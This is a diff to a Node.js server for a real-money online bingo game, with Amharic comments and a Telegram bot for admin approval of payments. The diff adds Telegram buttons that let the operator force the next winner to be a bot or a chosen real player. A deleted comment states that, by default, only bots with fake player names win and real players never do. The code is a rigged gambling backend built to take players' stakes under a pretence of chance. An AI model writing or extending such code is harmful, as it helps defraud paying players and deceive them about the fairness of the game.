@@ -26,7 +26,7 @@ let globalRoom = {
     playerTemporaryCards: {}
 };
 
-let forcedNextWinner = null; // 'bot', ዩዘር ID, ወይም 'random_real'
+let forcedNextWinner = null; 
 let activeGameInterval = null;
 let gameRoundCounter = 0;
 let currentRoundTargetCalls = 20;
@@ -178,23 +178,39 @@ async function pollTelegramUpdates() {
                     let parts = data.split('_');
                     let action = parts[0]; 
                     let requestId = parts.slice(1).join('_');
-                    let reqData = pendingRequests[requestId];
-                    if (reqData) {
-                        let targetSocket = io.sockets.sockets.get(reqData.socketId);
-                        if (action === 'app') {
-                            if (targetSocket) targetSocket.emit('financialApproved', { type: reqData.type, amount: reqData.amount });
-                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
-                                chat_id: chatId, message_id: messageId,
-                                text: `✅ *ጥያቄው ጸድቋል!* (${reqData.amount} ብር)`, parse_mode: 'Markdown'
-                            });
-                        } else {
-                            if (targetSocket) targetSocket.emit('financialRejected', { type: reqData.type, amount: reqData.amount });
-                            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
-                                chat_id: chatId, message_id: messageId,
-                                text: `❌ *ጥያቄው ተሰርዟል!*`, parse_mode: 'Markdown'
-                            });
+
+                    // 🟢 የቴሌግራም አድሚን አዝራሮች ቁጥጥር (ዕርምጃዎች)
+                    if (action === 'winbot') {
+                        forcedNextWinner = "bot";
+                        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                            chat_id: chatId, message_id: messageId,
+                            text: `👑 *ቀጣዩ አሸናፊ ቦት እንዲሆን ተደርጓል!*`, parse_mode: 'Markdown'
+                        });
+                    } else if (action === 'winrand') {
+                        forcedNextWinner = "random_real";
+                        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                            chat_id: chatId, message_id: messageId,
+                            text: `🎲 *ቀጣዩ አሸናፊ ራንደም ሪል ዩዘር እንዲሆን ተደርጓል!*`, parse_mode: 'Markdown'
+                        });
+                    } else {
+                        let reqData = pendingRequests[requestId];
+                        if (reqData) {
+                            let targetSocket = io.sockets.sockets.get(reqData.socketId);
+                            if (action === 'app') {
+                                if (targetSocket) targetSocket.emit('financialApproved', { type: reqData.type, amount: reqData.amount });
+                                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                                    chat_id: chatId, message_id: messageId,
+                                    text: `✅ *ጥያቄው ጸድቋል!* (${reqData.amount} ብር)`, parse_mode: 'Markdown'
+                                });
+                            } else {
+                                if (targetSocket) targetSocket.emit('financialRejected', { type: reqData.type, amount: reqData.amount });
+                                await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                                    chat_id: chatId, message_id: messageId,
+                                    text: `❌ *ጥያቄው ተሰርዟል!*`, parse_mode: 'Markdown'
+                                });
+                            }
+                            delete pendingRequests[requestId];
                         }
-                        delete pendingRequests[requestId];
                     }
                     try { await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { callback_query_id: callbackQuery.id }); } catch (e) {}
                 }
@@ -216,6 +232,25 @@ async function sendAdminFinancialRequest(requestId, type, amount, username, user
             reply_markup: { inline_keyboard: [[{ text: "✅ አጽድቅ", callback_data: "app_" + requestId }, { text: "❌ ሰርዝ", callback_data: "rej_" + requestId }]] }
         });
     } catch (error) {}
+}
+
+// 🟢 ጨዋታው ሲጀመር ለአድሚን በቴሌግራም ቻቱ ላይ የድል መቆጣጠሪያ አዝራሮችን መላኪያ
+async function sendAdminGameControlPanel(playersCount) {
+    if (!TELEGRAM_BOT_TOKEN || !ADMIN_CHAT_ID) return;
+    let message = `🎮 *አዲስ የቢንጎ ጨዋታ ተጀምሯል!*\n👥 ተጫዋቾች: *${playersCount}*\n\nየቀጣዩን ጨዋታ አሸናፊ ከዚህ በታች ይምረጡ፡`;
+    try {
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "🤖 ቦት ያሸንፍ", callback_data: "winbot_panel" },
+                        { text: "🎲 ራንደም ሪል ዩዘር ያሸንፍ", callback_data: "winrand_panel" }
+                    ]
+                ]
+            }
+        });
+    } catch (e) {}
 }
 
 let connectedRealPlayers = [];
@@ -324,6 +359,7 @@ setInterval(() => {
         }
 
         io.emit('gameStartedBroadcast');
+        sendAdminGameControlPanel(totalPlayers); // 🟢 ጨዋታው ሲጀመር ለአድሚን በቴሌግራም አዝራሮችን ይልካል
 
         if (activeGameInterval) clearInterval(activeGameInterval);
 
@@ -342,7 +378,6 @@ setInterval(() => {
                     let winningCardsList = [];
                     let activeSockets = Object.keys(globalRoom.playerRoundCards);
 
-                    // 1. አድሚኑ (አንተ) በፓነሉ በኩል ራሱ ዩዘር ID ወይም 'bot' ብሎ ካዘዘ
                     if (forcedNextWinner === "bot") {
                         let currentBots = getRealisticBotsCount(realCount);
                         if (currentBots > 0) {
@@ -357,7 +392,6 @@ setInterval(() => {
                             }
                         }
                     } else if (forcedNextWinner === "random_real") {
-                        // 🟢 አዲስ አዝራር 2: ሪል ተጫዋቾች ካሉ በዘፈቀደ አንዱ እንዲያሸንፍ ሲታዘዝ
                         let realPlayerSockets = activeSockets.filter(sId => {
                             let pData = globalRoom.playerRoundCards[sId];
                             return pData && !String(pData.userId).startsWith("bot");
@@ -365,18 +399,15 @@ setInterval(() => {
                         if (realPlayerSockets.length > 0) {
                             let randSocket = realPlayerSockets[Math.floor(Math.random() * realPlayerSockets.length)];
                             let pData = globalRoom.playerRoundCards[randSocket];
-                            // የእሱን የመጀመሪያ ካርድ እንደ አሸናፊ እንወስዳለን
                             if (pData.cards && pData.cards.length > 0) {
                                 winningCardsList.push({ username: pData.username, userId: pData.userId, cardNum: pData.cards[0] });
                             }
                         }
                         if (winningCardsList.length === 0) {
-                            // ካልተገኙ በቦት ይመረታል
                             let winningUser = fakeBotNames[Math.floor(Math.random() * fakeBotNames.length)];
                             winningCardsList.push({ username: winningUser, userId: "bot_fallback", cardNum: 22 });
                         }
                     } else if (forcedNextWinner && forcedNextWinner.length > 0) {
-                        // 🟢 አዝራር 1: የተወሰነ ዩዘር ID ሲገባ
                         for (let sId of activeSockets) {
                             let pData = globalRoom.playerRoundCards[sId];
                             if (String(pData.userId) === forcedNextWinner || sId === forcedNextWinner) {
@@ -385,13 +416,11 @@ setInterval(() => {
                                 }
                             }
                         }
-                        // ከተጫዋቾቹ መካከል ካልተገኘ በፎርሰድ ካርድ ይመረታል
                         if (winningCardsList.length === 0) {
                             winningCardsList.push({ username: "ተጫዋች", userId: forcedNextWinner, cardNum: 22 });
                         }
                     }
 
-                    // 2. አድሚኑ ካላዘዘ -> ራንደም በሆነ መልኩ ቦቶቹ ብቻ ያሸንፋሉ (ሪል ተጫዋቾች በራሳቸው ፈቃድ ፈጽሞ አያሸንፉም)
                     if (winningCardsList.length === 0 && !forcedNextWinner) {
                         let currentBots = getRealisticBotsCount(realCount);
                         let winnersCountToPick = 1;
